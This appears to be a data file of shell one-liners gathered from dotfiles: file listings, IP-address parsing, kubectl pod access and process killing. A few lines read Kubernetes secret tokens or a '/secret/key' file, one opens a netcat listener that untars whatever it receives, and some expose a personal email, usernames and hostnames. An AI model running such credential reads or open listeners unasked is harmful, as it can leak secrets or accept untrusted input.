"ls /dev | grep ""USB\|ACM"""
"ls .???* 2> /dev/null || echo ""no hidden files here..."""
"ls -t ~/Downloads | head -1 | xargs -I % mv -v ~/Downloads/% ~/Documents/Receipts/`date ""+%Y-%m-%d-%H:%M:%S""`-%"
"ls -t ~/.lolcommits/**/*.gif | sed ""s/^/<img src=\""/"" | sed ""s/$/\"">/"" > ~/temp_lolcommitters.html && open ~/temp_lolcommitters.html"
"ls -t /boot/vmlinuz-* | sed ""s/\/boot\/vmlinuz-//g"" | head -n1"
"ls -rt1 logs/*out; echo """" ; ls -rt1 logs/*out|tail -1|xargs tail -f "
"ls -rt1 logs/*/*out 2>/dev/null;echo ""--------"";ls -rt1 logs/*/*out 2>/dev/null|tail -1|xargs tail -f "
"ls -prt | grep / | sed ""s/\///"""
"ls -l|grep ""^d"" | more"
"ls -l| grep -v ""\.o$"" | grep -v ""\.a$"""
"ls -l| grep ""^d"" | wc -l"
"ls -ltr | grep -v ""^total"" | head"
"ls -ltgGhp --time-style=+%d-%b-%Y | head | sed -E ""s/^[d-][rwx-]+ [0-9]+ //"""
"ls -lt | sed -e ""s/^.\{10\}[ ]*[0-9]*[ ]*\w*[ ]*\w*[ ]*[0-9]*//g"" | ${MANPAGER}"
"ls -lt | grep -v ""^total"" | head"
"ls -lrtd $(git status --porcelain | grep ""^.[?M]"" | sed ""s/^.. //"")"
"ls -lhtr | tr -s "" "" | cut -d "" "" -f6-"
"ls -lh | more | grep -v ""^d"""
"ls -lh | more | grep ""^d"""
"ls -lh | awk '{print \$5, \$9}' | column -t"
"ls -lct /etc | tail -1 | awk '{print $6, $7, $8}'"
"ls -lahs |\grep -E '^\s*([0-9][0-9,]+M|[0-9,]+G)'"
"ls -lahFG | grep -E ""^-|^l"""
"ls -lah | awk '{print \$5, \$9}' | column -t"
"ls -lah --time-style=long-iso $(find . -type f) | sort -h -k5 | grep -v ""./.git"""
"ls -lah --color=always | ag --nocolor ""^(d|l)"""
"ls -laF | grep -v ""^-"" && ls -laF | grep ""^-"""
"ls -la ~/tutors/ | grep -E ""[a-zA-Z0-9]*\.[a-zA-Z0-9]+"" -o | grep -E ""^[^\.]*"" -o"
"ls -la | grep -i ""\->"" | awk ""/ / { print \$9, \$11 }"""
"ls -la | grep ""^d"" && ls -la | grep -v ""^d"""
"ls -la | grep ""^[^d]"" | grep "" \."""
"ls -la | grep ""^-"" | wc -l"
"ls -lR|grep ""^d""|wc -l"
"ls -lR|grep ""^-""|wc -l"""""
"ls -lR|grep ""^-""|wc -l"
"ls -lR| grep ""^-"" | wc -l"
"ls -lA | grep --color=never -v ""^d"" | awk "
"ls -lA | grep --color=never ""^d"" | awk "
"ls -lA | grep ""^d"" | wc -l"
"ls -lA | egrep -v ""^d|^l"""
"ls -l |grep ""^d""|wc -l"
"ls -l |grep ""^-""|wc -l"
"ls -l | sort +4r | grep -v ""total"""
"ls -l | grep -ve ""^total"" | wc -l"
"ls -l | grep -e ""^d"" | wc -l"
"ls -l | grep --color=never -v ""^d"" | awk "
"ls -l | grep --color=never ""^d"" | awk "
"ls -l | grep ""^l"" | wc -l"
"ls -l | grep ""^d"" | wc -l"
"ls -l | grep ""^-"" | wc -l"
"ls -l node_modules | grep ^l | awk '{print substr(\$9, 0, length(\$9)-1)}'"
"ls -goR | grep -v ^d | awk ""{sum += \$3} END{print sum}"""
"ls -dm .[^$.]* 2> /dev/null || echo ""<no dot files>"""
"ls -dlL .[^$.]* 2> /dev/null || echo ""<no dot files>"""
"ls -dl .[^$.]* 2> /dev/null || echo ""<no dot files>"""
"ls -d1 .[^$.]* 2> /dev/null || echo ""<no dot files>"""
"ls -d .[^$.]* 2> /dev/null || echo ""<no dot files>"""
"ls -d .[[:alnum:]]* 2> /dev/null || echo ""No hidden files here..."""
"ls -d .[[:alnum:]]* 2> /dev/null || echo ""No hidden files here"""
"ls -d .[[:alnum:]]* 2> /dev/null || echo ""No hidden file here..."""
"ls -clr | grep $(date ""+%Y-%m"") | sort -k 6 -r"
"ls -ap | grep / | sed ""s/\///"""
"ls -ap | grep -v / | egrep ""^\.""; pwd "
"ls -ap | grep -v / | egrep ""^\."""
"ls -ap | grep -v / | egrep ""^\."" "
"ls -alrt | grep ""^-"" | awk ""{print \$10}"" "
"ls -alh | egrep -v ""\s+\.\S*$"" | egrep -e ""^d"""
"ls -al | sort -k1,1 -k9,9 -r |sed -r 's/^.*users[ ]*[0-9]{1,8} //'"
"ls -al | grep ""^d"" | wc -l"
"ls -al | grep ""^-"" | wc -l"
"ls -al | egrep ""^d"" | awk ""{print ""$dolr""9}"""
"ls -al | egrep ""^[d|l]"""
"ls -al `git status | grep modified | cut -d"":"" -f2`"
"ls -a | egrep ""^\."" | wc -l"
"ls -R | rg "":$"" | sed -e "
"ls -R | grep "":$"" | sed -e "
"ls -Nla --color | egrep --color=none ""^d|^l"""
"ls -Grt | sort -r -k 1,10 | grep ""^[0-9]"""
"ls -GR | grep --color=always "":$"" | sed -e "
"ls -F | grep ""[^/]$"" | column"
"ls -F | grep ""/$"" | column"
"ls -A| while read a ; do du -hs ""$a"" ;done| sort -nr"
"ls -Ap | grep -v / | egrep ""^\."""
"ls -Alrt | grep ""^-"" | awk ""{print \$9}"" "
"ls -Alrt | grep ""^-"" | awk ""{print \$10}"" "
"ls -Alh | grep "" \."" | sort"
"ls -Alh --sort=size . | tr -s "" "" | cut -d "" "" -f 5,9"
"ls -AR | grep "":$"" | sed -e "
"ls -A | grep ""^\..*"" | cat"
"ls -1p | grep ""/$"" | sed ""s/\/$//"""
"ls -1ad ../ ./ */ | ppe 's@/@@' | pcregrep -v '^[.]{1,2}$'"
"ls -1Aph | grep -v ""\/"" |"
"ls -1AF | while read line; do sudo du -hs ""$line"" 2>/dev/null; done | sort -h"
"ls -1 | while read dir; do echo ""`du -ch \""$dir\""` ...... `pwd`/$dir"" | grep total;done"
"ls -1 src/learning/app/migrations/*.py | sed ""s/^[a-z\/]*\([0-9]*\)\(.*\)$/\1/"" | uniq -d"
"ls *[part][art][rt0][t0]1.rar $(ls *[Rr][Aa][Rr] | egrep -vi ""part[0-9]*."" ) | xargs -izz unrar x -o+ zz"
"ls *.tex |xargs style -l 29 | \
"ls *-dist -1 | sed ""s/-dist//"" | while read file; do echo ""DIFF $file""; diff $file-dist $file; done"
"ls $LS_OPTIONS | egrep -v '^d' | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls $LS_OPTIONS -a | egrep -v '^d' | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"lpass status -q || lpass login jan.hnizdil@livesport.eu; lpass ""$@"""
"locate -e --regex ""\.pac(new|orig|save)$"""
"locate ""/*"" | fzf --preview=""head -$LINES {}"" | xargs -r sudo nvim"
"locate ""/*"" | fzf --preview=""head -$LINES {}"" | xargs -r nvim"
"load-aliases || source ""${__BASH_ALIASES}"""
"ln | awk ""{print \$2}"" | sudo xargs kill -9"
"llaa | grep ""^[d|l]"""
"lla | grep -v ""\->"" | cut -c $fncut"
"lla | grep ""^[d|l]"""
"lla | grep ""\->"" | cut -c $fncut"
"ll ~/.vnc |grep pid | sed ""s/.pid//g"""
"ll | grep / | grep "" \."""
"ll | grep -e ""^d"" | grep -v "" \."""
"ll | grep ""^[d|l]"""
"ll | \grep ""/$"" && la | \grep -v ""/$"""
"ll /proc/$(pgrep cmus)/fd|sed ""s/->/\n/g""|tail -n1"
"ll /dev | grep -E ""(sd|mmcblk)"""
"ll -t |sed -r ""s/(.*) ([^ ]+)$/\2 \1/"" |vN -"
"ll -d .[[:alnum:]]* 2> /dev/null || echo ""No hidden files here..."""
"ll -TI ""node_modules|.git|.git-old"""
"ll -TI ""node_modeules|.git|.git-old"""
"ll $1 | egrep -v ""^d"" | gawk "
"ll $1 | egrep ""^d"" | gawk "
"links -http-proxy ""$(echo $http_proxy | sed -e ""s/http:\/\///"" -e ""s/\/$//"")"" -https-proxy ""$(echo $https_proxy | sed -e ""s/http:\/\///"" -e ""s/\/$//"")""'"
"links -dump ""http://www.amazon.com/gp/product/1590595874"" | grep ""in Books"" | grep -v Explore"
"linen | sort -rn | sed ""s/^[0-9]* //g"""
"let i=1 | g/,\d\+)/s//\=','.i.')'/ | let i=i+1"
"ledgerdb script /home/ben/dotfiles/ledger/unbudgeted.sql | column -s""|"" -t"
"ledgerdb script /home/ben/dotfiles/ledger/cashflow.sql | column -s""|"" -t"
"last | grep "":0 "" | head"
"la | grep ""\-> /home/alex/"" | less -R"
"l | awk ""{if(index(\$8, \"":\"")){print}}"" | g ""$(date ""+%-m月 *%-d"")"""
"kubetail ""grid-(server|jobs|celery\S*)"" --regex"
"kubegetpod(){ kubectl get pods --selector=""$1"" | sed -n 2p | cut -d"" "" -f1; }; kubegetpod"
"kubegetlogs(){ kubectl logs -f $(kubectl get pods --selector=""$1"" | sed -n 2p | cut -d"" "" -f1); }; kubegetlogs"
"kubectl logs -n openstack $(kubectl get pods -n openstack | grep armada-api | awk ""{print $1}"")"
"kubectl label po `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true po | fzf | tr -d ""\n""` app- debug=true --overwrite=true"
"kubectl get pods | grep data-quality | while read a b; do echo ""$a""; done"
"kubectl get pod | sort -nk 4 | grep -v ""Running 0"""
"kubectl get pod --all-namespaces|grep -v ""Running"" |grep -v ""Completed"""
"kubectl get nodes -o json | jq "".items[]|{name:.metadata.name, taints:.spec.taints}"""
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true pods | fzf | tr -d ""\n""` bundle exec rails c"
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true pods | fzf | tr -d ""\n""` bash"
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true -l debug=true pods | fzf | tr -d ""\n""` bundle exec rails c"
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true -l debug=true pods | fzf | tr -d ""\n""` bash"
"kubectl exec -it `kubectl get pods | grep oahu-redis | cut -f 1 -d "" ""` sh"
"kubectl exec -it `kubectl get pods | grep oahu-frontend | cut -f 1 -d "" ""` sh"
"kubectl exec -it `kubectl get pods | grep oahu-db | cut -f 1 -d "" ""` sh"
"kubectl exec -it `kubectl get pods | grep oahu-backend | cut -f 1 -d "" ""` sh"
"kubectl exec -it -n openstack $(kubectl get pods -n openstack | grep armada-api | awk ""{print $1}"") -- bash"
"kubectl describe -n kube-system secret/$(kubectl -n kube-system get secret | grep kubernetes-dashboard-token|cut -d"" "" -f1)"
"kubectl config view | grep -A10 ""name: $(kubectl config current-context)"" | awk "
"kubectl config use-context ""$(klc | fzf -e | sed ""s/^..//"")"""
"kubectl config set-context --current --namespace ""$(kln | fzf -e | sed ""s/^..//"")"""
"kubectl config get-contexts --no-headers $(kubectl config current-context) | awk ""{print \$5}"" | sed ""s/^$/default/"""
"kubectl config get-contexts --no-headers ""$(krc)"" | awk ""{print \$5}"" | sed ""s/^$/default/"""
"kubectl -n kube-system describe secret admin-user | grep ""token:"" | awk "
"kubectl -n com-att-ocnp-mgmt get po $POD -o yaml | grep ""mountPath:"" | grep -i brick"
"kubectl -n com-att-ocnp-mgmt exec -it $(kubectl -n com-att-ocnp-mgmt get pods -l heketi -o name | cut -d""/"" -f2) -- heketi-cli -s http://localhost:8080 --user admin --secret $(kubectl -n com-att-ocnp-mgmt exec -it $(kubectl -n com-att-ocnp-mgmt get pods -l heketi -o name | cut -d""/"" -f2) -- cat /secret/key)"
"kubectl -n ${NS:-globe} exec -ti $(kubepods | fzf | sed ""s/pods\///g"")"
"kp | grep "" [0-9]h"" ; kp | grep "" [0-9]s"""
"knife ssh ""\|:1"" ""\|:2"""
"kn | grep pdm | while read namespace; do kn ""$namespace"" && kscale0 ; done"
"kill `ps aux|grep goagent |sed ""s/\(.*\) *\(.*\) *.*/\2/""`"
"kill `ps aux | grep ""ssh -f prosanes@dev2.virtualshelf.net -L 3307:127.0.0.1:3306 -N"" | awk ""{print $2}""`"
"kill `ps aux | grep ""ssh -f bmentges@dev2.virtualshelf.net -L 3307:127.0.0.1:3306 -N"" | awk ""{print $2}""`"
"kill `ps -a | grep ruby | cut -f1 -d "" ""` && rails server & "
"kill `myps | grep lobster | awk ""{ print $2 }""`"
"kill -KILL `pgrep ""MonoDevelop|Xamarin|Studio""` && pkill mono"
"kill -HUP $(ps -A -o stat,ppid | grep -e '[zZ]'| awk '{ print $2 }')"
"kill -9 `pstree -p | grep 'python' | egrep -o '[0-9]{1,}'`"
"kill -9 `ps aux | grep perl | cut -c 10,11,12,13,14`"
"kill -9 `lsof -i tcp:45691 | tail -1 | awk ""{print $2}""`"
"kill -9 `jps -mv | grep jetty | cut -f1 --delimiter="" ""`"
"kill -9 `jps -mv | grep grails | cut -f1 --delimiter="" ""`"
"kill -9 $(ps auxww | grep [v]irt | awk ""{ print $2 }"")"
"kill -9 $(ps aux | grep [d]eluge | awk ""{print $2}"")"
"kill -9 $(ps -e | grep skype | cut -d"" "" -f2)"
"kill -9 $(ps -Ao 'pid,command' | grep '[e]macs' | awk '{print $1}')"
"kill -9 $(ps -A n | grep ""[^]] ruby script/server"" | egrep ""^\s*[0-9]+"" -o)"
"kill $(ps | grep python| awk ""{ print \$1}""); fg"
"kill $(ps aux | grep tmux: -m 1 | sed -e ""s/ .*//"")"
"kill $(ps aux | grep ""ssh"" | awk "
"kill $(ps aux | grep ""plug run"" | awk ""{print $2}"")"
"kill $(ps -o pid -o command ax | grep ""$1"" | cut -c1-6)"
"kill ""$(wininfo | grep _NET_WM_PID | cut -d"" "" -f3)"""
"kid3-cli -c ""get comment"" ""$(mocp --info | grep File | cut -b 7-)"""
"kgpn | fzf --preview ""kubectl logs {}"" --bind ""f1:execute(kubectl logs {} | less -F)"" --no-height --header ""Press F1 for output in less"""
"k port-forward $(k get pods | fzf | awk ""{print \$1}"" ) 5000:5000"
"k get services '-o=custom-columns=NAME:.metadata.name,NODEPORT:.spec.ports[0].nodePort' --no-headers | grep -v '<none>' | sort -k 2n"
"k config use-context ""$(klc | fzf -e | sed ""s/^..//"")"""
"k config set-context --current --namespace ""$(kln | fzf -e | sed ""s/^..//"")"""
"k config get-contexts --no-headers ""$(krc)"" | awk ""{print \$5}"" | sed ""s/^$/default/"""
"k --namespace=default exec -it `k get pods --namespace=default | grep busybox | cut -d "" "" -f 1` sh"
"juju status haproxy | grep public-address | sed -e ""s/.*: //"""
"jstack $(jps | grep surefirebooter | cut -f 1 -d "" "")"
"json | jq '.[""@prod""].ssh' | tr -d ""[\""]"")"
"json -I -f package.json -e ""v = this.version.split(/\./g); if (v.length !== 3 || isNaN(Number(v[2]))) throw new Error(\""wtf semver\""); v[2]=Number(v[2])+1; this.version = v.join(\"".\"")"""
"jrnl -from ""$([[ $(date +%u) -eq 1 ]] && echo friday || echo yesterday)"""
"jq -r ""to_entries|map(\""\(.key)=\(.value)\"")|.[]"""
"jq -cr '.items[] | {name: .metadata.name, name2: .spec.containers[].name, phase: .status.phase, reqs: .spec.containers[].resources.requests, limits: .spec.containers[].resources.limits} | select(.phase == \"
"jq --unbuffered -C '{start: .started, end: .finished, req_method: .payload.request.method, req_path: .payload.request.path, req_body: .payload.request.body, res_code: .payload.response.code, res_body: .payload.response.body|fromjson }' | less -R "
"jq '[.machines|to_entries[]| {base: .value.extra_data.box.name, data_path: .value.local_data_path, id: .key, name: .value.name, path: .value.vagrantfile_path, state: .value.state}]' ~/.vagrant.d/data/machine-index/index"
"jq "".data.stories.stories[] | \"" - [\"" + (.id | tostring + \""](\"") + .url + \"") \"" + .name"" -r"
"jq ""((.bytes | tonumber) / pow(1024; 3)) | floor"""
"jps -m | grep Node | sed ""s/^\([^ ]* \)\([^ ]* \)*\([^ ]*\)$/\1 \3/"""
"jps -l|grep org.apache.catalina.startup.Bootstrap|cut -d "" "" -f1"
"jps -l | grep com.caucho.server.resin.Resin | cut -d"" "" -f1"
"journalctl -u sshd | grep ""[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}"" -o | sort -u"
"jobs | wc -l | sed -e ""s/^[ \t]*//"""
"jobs -p | grep -o '[0-9]\{4,5\}' | xargs kill -9"
"jobs -l || echo ""no running jobs"""
"jdeps --multi-release 9 -cp .:./BOOT-INF/lib/* -R ./BOOT-INF/classes/hello/Application.class | awk '{print \$4}' | awk 'NR>0{arr[\$1]++}END{for (a in arr) print a, arr[a]}'"
"iw dev wlp3s0 scan | egrep ""SSID|signal"""
"it ps | tr -s ' ' | cut -d' ' -f2,4"
"isoinfo -d -i /dev/cdrom | grep -i -E ""block size|volume size"""
"iso=$( ls -rt /share/Software/images/grml96*iso 2>/dev/null | tail -n1 ) ; iso=${iso:-$( find /boot -iname ""grml*iso"" 2>/dev/null )} ; iso=${iso:-$( find ~/ -iname ""*grml*iso"" 2>/dev/null | tail -n1 )} ; echo ""$iso"" ; unset iso"
"is_git || err ""not in a git repo"" && { git push --tags && git checkout master && git push && git checkout develop && git push; }"
"is_git && __grt=""$(git rev-parse --show-toplevel)"" && [[ -n ""$__grt"" ]] && cd -- ""$__grt"" && unset __grt || { err ""are you in a git repo?""; unset __grt; }"
"ipython --no-confirm-exit || /usr/bin/env python3 -i -c ""import re;import os;import sys;import math;import glob;import collections;import itertools;"""
"ipcs -m && phd && pld && netstat -antp 2>/dev/null | egrep ""Proto.*Program name|$DEVPORT1"""
"ipcs -m && ph && pl && netstat -antp 2>/dev/null | egrep ""Proto.*Program name|$EPORT1"""
"ipconfig getifaddr en1|perl -pe ""s/\r|\n//m"""
"ipconfig getifaddr en0 | tee >(tr -d ""\n"" | pbcopy)"
"ip_addr | tr -d ""\n"" | pb; ip_addr"
"ip route get 8.8.8.8 | head -1 | cut -d"" "" -f7"
"ip route get 1 | head -1 | cut -d "" "" -f7"
"ip a|grep ""inet ""|awk ""{gsub(/\/[0-9]+/, \""\""); print \$2}"""
"ip addr | grep inet | sed -e ""s#\s*inet \([0-9.]*\).*\ \([a-z0-9]*\)#\2 \1#g"""
"ip addr | grep global | awk ""{print $2}"""
"ip addr | grep -w inet | gawk '{if (NR==2) {$0=$2; gsub(/\//,"
"ip addr | grep -P -o ""192.168.1.[0-9]+"" | grep -v 192.168.1.255"
"ip addr | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | \
"ip addr | grep ""state UP"" -A 2 | grep -Eo ""inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}""; python3 -m http.server 8000"
"ip addr show|grep ""inet""| grep -v ""inet6"""
"ip addr show | grep -o ""192\.168\.0\.[1-9]*/"" | sed s/.$//"
"ip addr show eth0 | grep -o -E ""inet\ [0-9\.]+"" | cut -d"" "" -f2"
"ip addr show dev eth0 | grep ""inet "" | cut -d"" "" -f6"
"ip addr show dev `ip link show | egrep -o ""eth[0-9]+|eno[0-9]+""`"
"ip addr show dev $(ip route | awk ""/^default/ {print \$5}"") | awk -F""[ /]*"" ""/scope global/ { print \$4 }"""
"ip addr show dev $(ip route | awk ""/^default/ {print \$5}"") | awk -F""[ /]*"" ""/scope global/ { print \$3 }"""
"ip a |grep inet' '|awk '{print gensub(/(.+)\/.+/, \"
"ip a | grep ""inet "" | grep -Pe ""[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"""
"ip a | grep ""inet "" | awk "
"ip -o a | grep -v ' lo ' | cut -d ' ' -f2,7"
"ip -o -f inet addr | grep -v ""127.0.0.1"" | cut -d"
"ip -c -o a | cut -d ' ' -f2,7 | sed 's/ /\t/'"
"ip -6 -o addr | grep -vi ""fe80::"" | sed -s ""s/\\\/\n/g"""
"iostat -dxm | cut -c 1-7,51-56,59-65 | sed -e s/""sda ""/Vault/ -e s/sdb/NFS/ -e s/sdc/KVM/ -e s/sde/SSD/ -e /\n/d -e /^$/d "
"ioreg -w0 -l | grep Capacity | cut -d "" "" -f 17-50"
"ioreg -r -l -k ""BatteryPercent"" | egrep ""BatteryPercent|Product\"""""
"ioreg -l | grep -E ""BatteryPercent|Bluetooth Product Name"""
"interface=any; filter=""not port 22""; comment=""""; pcap=~/.pcaps/$(nn)-$interface.pcapng; tshark -QwnlpFpcapng -w - --capture-comment ""$comment"" -i $interface $filter | tee $pcap | tshark -lt a -r - --color"
"insult | tr -d ""\n"" | pbcopy"
"infocmp -1 | sed -nu 's/^[ \000\t ]*//;s/[ \000\t ]*$//;/[^ \t\000]\{1,\}/!d;/acsc/d;s/=.*,//p'|column -c80"
"inet | grep ""inet addr"" | grep -v ""127.0.0.1"""
"ifconfig|pcregrep -o 'inet \d{1,3}\.\d{1,3}.\d{1,3}.\d{1,3}'|grep -v 127.0.0.1"
"ifconfig|grep -i -m1 ""inet addr"" | cut -d"
"ifconfig|grep -A 4 ""en0""|grep ""inet """
"ifconfig |grep inet && echo ""nc -l -p 4711"" && nc -l -p 4711 | tar xv"
"ifconfig |grep ""inet 192"" |cut -c 7-19"
"ifconfig | perl -0ne 'while ( /(?:^|\n)(\w+).*?Link.*?inet\saddr:(\S+)/gs ) { printf qq/%8s => %s\n/, \$1, \$2 }'"
"ifconfig | pcregrep -M -o ""^[^\t:]+:([^\n]|\n\t)*status: active"""
"ifconfig | grep inet | awk ""{ print \$2 }"""
"ifconfig | grep broadcast | egrep ""\s\d+\.\d+\.\d+\.\d+\s"""
"ifconfig | grep broadcast | cut -d"" "" -f2"
"ifconfig | grep broad | cut -f2 -d"" """
"ifconfig | grep 192.168 | sed ""s/inet \(.*\) netmask.*/\1/"""
"ifconfig | grep 10.10 |python3 -c ""import sys;print(sys.stdin.read().split()[1])"""
"ifconfig | grep -o -E 'inet.*[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*[bB].*cast' | grep --color -o -E '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}'"
"ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}|^[a-z].*:'"
"ifconfig | grep -o '\inet\s[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.*broadcast' | grep -o '[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}'"
"ifconfig | grep -o ""inet \(192\.168\.\d\+\.\d\+\)"" | grep -o ""192\.168\.\d\+\.\d\+"""
"ifconfig | grep -i bcast | cut -d"" "" -f13"
"ifconfig | grep -Po '(?<=inet )\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | grep -v '127.0.0.1'"
"ifconfig | grep -P '\b(?:\d{1,3}\.){3}\d{1,3}\b ' -om 2 | tail -rn 1"
"ifconfig | grep -Eo '169.254.\d{1,3}.\d{1,3}' | head -n1"
"ifconfig | grep -Eo ""broadcast (addr:)?([0-9]*\.){3}[0-9]*"" | cut -d"" "" -f2"
"ifconfig | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | \
"ifconfig | grep --color=never -o ""inet addr:10[^ ]*"" | grep --color=never -o ""10.*"""
"ifconfig | grep 'inet ' | awk '{split(\$2, ip_cntr, \"
"ifconfig | grep ""inet\|ether"""
"ifconfig | grep ""inet"" | tail -1"
"ifconfig | grep ""inet"" | grep -v 127.0.0.1"
"ifconfig | grep ""inet addr""| grep -v ""127.0.0.1"""
"ifconfig | grep ""inet addr"" | grep -v 127"
"ifconfig | grep ""inet 10"" | cut -f 2 -d "" """
"ifconfig | grep ""inet "" | grep -v 127.0.0.1"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 "
"ifconfig | grep ""inet "" | grep -v 127"
"ifconfig | grep ""inet "" | grep -v ""127.0.0.1"""
"ifconfig | grep ""inet "" | grep -Fv 127.0.0.1"
"ifconfig | grep ""inet "" | cut -d "" "" -f 2"
"ifconfig | grep ""inet "" | awk ""{print \$2}"""
"ifconfig | grep ""inet "" | awk ""{ print $2 }"""
"ifconfig | grep ""inet "" -B1 | grep "
"ifconfig | grep ""broadcast"" | cut -b7-20"
"ifconfig | grep ""192\.168\.[0-9]*\.[0-9]*"" | sed -e ""s/^.*inet //"" -e ""s/ .*//"""
"ifconfig | egrep -o 'addr:([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}' | egrep -o '[[:digit:]].*'"
"ifconfig | awk '/vm/,/inet.*/' | awk '/inet.*/ {print \$2}'"
"ifconfig | awk '/inet/ {print substr($0, index($0, $2))}' | awk '/ netmask/ {print $1}'"
"ifconfig | ag ""inet "" | ag -v 127.0.0.1"
"ifconfig wlan0 | grep status | cut -d "" "" -f 2"
"ifconfig wlan0 | grep ssid | cut -d "" "" -f 2"
"ifconfig wlan0 | grep inet | cut -d "" "" -f 2"
"ifconfig wlan0 | grep -o ""addr:[0-9.]*"" | grep -o ""[0-9.]*"""
"ifconfig net1 | grep broadcast | sed ""s/netmask.*//"""
"ifconfig eth0 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | head -n 1"
"ifconfig eth0 | grep -Po ""inet .. "" | cut -d"" "" -f2"
"ifconfig eth0 | grep -Po ""ether .. "" | cut -d"" "" -f2"
"ifconfig eth0 | grep 'inet addr' | sed 's/[ \t]*inet addr:\([0-9]\{0,3\}\.[0-9]\{0,3\}\.[0-9]\{0,3\}\.[0-9]\{0,3\}\).*/\1/'"
"ifconfig eth0 | egrep -o ""([[:xdigit:]]{0,4}[:]){7}[[:xdigit:]]{0,4}"" | sed -n 1p"
"ifconfig eth0 | egrep -o ""([0-9]{1,3}\.){3}[0-9]{1,3}"" | sed -n 1p"
"ifconfig enp35s0 | grep --word-regexp inet | awk ""{print $2}"""
"ifconfig enp1s0 | grep ""inet "" | awk "
"ifconfig en4 | awk ""{ print $2}"" | grep -E -o ""([0-9]{1,3}[\.]){3}[0-9]{1,3}"""
"ifconfig en1 | grep inet | cut -d "" "" -f2"
"ifconfig en1 | grep ""inet "" | tr -d ""[:alpha:][000]"""
"ifconfig en1 | grep ""inet "" | cut -d"" "" -f2"
"ifconfig en0 | grep inet\ | cut -d"" "" -f2"
"ifconfig en0 | grep inet | cut -d "" "" -f2"
"ifconfig en0 | grep ether | sed ""s/ *\t*ether //"""
"ifconfig en0 | grep ether | cut -d "" "" -f2"
"ifconfig en0 | grep broadcast | awk ""{print \$2}"" "
"ifconfig en0 | grep ""inet ""; ifconfig en1 | grep ""inet """
"ifconfig en0 | grep ""inet "" | awk ""{print \$2}"""
"ifconfig en0 | awk '{ print $2}' | grep -E -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
"ifconfig en0 inet | grep ""inet "" | awk "" { print } """
"ifconfig 2>/dev/null | grep broadcast | cut -d"" "" -f10"
"ifconfig -s | sed 1d | cut -d"" "" -f1"
"ifconfig -a | grep inet\ | cut -d "" "" -f2-"
"ifconfig -a | grep -w inet | cut -d"" "" -f2 "
"ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' \
"ifconfig -a | grep ""168\|172"""
"if which tmux > /dev/null 2>&1; then test -z ""$TMUX"" && (tmux attach || tmux new -s zy -n home); fi"
"if [[ $(ps -fe|grep nm-applet|grep -v grep)""x"" = ""x"" ]]; then nm-applet & fi;sudo service NetworkManager stop;echo ""Esperando 3 segundos""; sleep 3; sudo service NetworkManager start"
"if [ `pwd | tr / ""\n"" |tail -n 1` != ""build"" ]; then mkdir -p build; cd build; fi; qmake .. && make"
"if [ `pwd | tr / ""\n"" |tail -n 1` != ""build"" ]; then mkdir -p build; cd build; fi; cmake .. && make'"
"if [ -z ""$TMUX"" ]; then tmux attach -t mi || tmux new -s mi; fi"
"if [ $TERM != ""screen-256color"" ] && [ $TERM != ""screen"" ]; then;tmux attach || tmux new; exit;fi"
"if [ $? = 0 ]; then terminal-notifier -title ""$(history | tail -n1 | sed -E "
"if [ ! -t 0 ]; then text=$(< /dev/stdin); fi; zgrep() {if [ ! -z ""$text"" ]; then content=$text; unset text; em=""""; for x in $*; do [[ ${x} =~ ^-.*$ ]] && em=""$em $x""; done; echo $em; echo ""$content"" | grep --color=auto $em $1 | grep --color=auto -v grep; else grep --color=auto $*; fi;}; zgrep"
"if [ ! ""$SSH_AUTH_SOCK"" ] || ! ls $SSH_AUTH_SOCK &>/dev/null; then eval `ssh-agent`; ssh-add ~/.ssh/cwt.priv; fi"
"if (( $(( $(date +%s) - $(cat /tmp/last_apt_update 2>/dev/null || echo 0) )) > 3600 )); then
"if ( `pdiff \!* | grep -v ""==== //depot/prod"" | wc -l` == 0) p4 revert \!*"
"if ! ps aux | grep ""emacs --bg-daemon"" | grep -v grep > /dev/null; then emacs --daemon; fi && emacsclient -c -nw"
"identicon -s 256 -t -H $(echo ""$(whoami)@$(hostname)""| md5sum | sed ""s/[\ ,-]//g"") -o ~/.face"
"hub release show -f ""- \`%T\` %t (%pD) \| [link](%U) \| [tarball](%uT) [zipball](%uZ)%n%n\`\`\`%n%b\`\`\`"""
"hub pr list | grep -i $(git rev-parse --abbrev-ref HEAD | sed -E ""s/([A-Z]{2})-([[:digit:]]{4})-.*/\1[-[:blank:]]*\2/g"")"
"hub pr list -f ""%pC%>(8)%i%Creset %t | %au | Assignees: %as %n"""
"hub browse $(ghq list | peco | cut -d “/” -f 2,3)"
"hub browse $(ghq list | peco | cut -d ""/"" -f 3,4)"
"hub browse $(ghq list | peco | cut -d ""/"" -f 2,3)"
